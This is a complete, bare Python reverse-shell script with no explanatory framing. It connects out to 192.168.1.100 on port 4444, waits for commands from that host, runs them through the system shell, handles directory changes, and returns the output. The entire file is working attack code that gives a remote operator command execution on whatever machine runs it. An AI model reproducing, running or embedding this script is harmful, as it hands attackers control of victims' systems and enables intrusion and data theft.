import socket
import subprocess
import os

s = socket.socket()
s.connect(("192.168.1.100", 4444))

while True:
    data = s.recv(1024).decode("utf-8")
    if data.lower() == "exit":
        break
    if data[:2] == "cd":
        try:
            os.chdir(data[3:])
        except:
            pass
        s.send(b"")
        continue
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    out, err = proc.communicate()
    s.send(out + err)

s.close()
